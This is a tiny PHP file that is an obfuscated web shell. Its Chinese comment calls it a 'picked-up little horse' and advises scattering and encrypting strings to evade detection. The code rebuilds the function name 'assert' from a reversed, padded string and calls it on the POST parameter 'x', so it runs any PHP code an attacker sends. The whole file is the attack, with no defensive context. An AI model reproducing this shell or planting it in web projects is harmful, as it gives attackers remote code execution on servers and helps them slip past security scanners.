<?php

/**
 * 这是一只捡来的小马;
 * assert($_POST['X']);
 * 2015年4月7日 09:24:54
 * 升级建议,
 * 可以把字符串组装,分布在不同的地方.
 * 结合使用其它的字符串加密打散技术.
 * @var [type]
 */
$t = strrev("t/***r-*/-es/*-s*a");
$t = str_replace("/", "", $t);
$t = str_replace("*", "", $t);
$t = str_replace("-", "", $t);

$x = strrev("TSOP");
$c = strrev("]'x'[");
$t($_POST["x"]);
?>
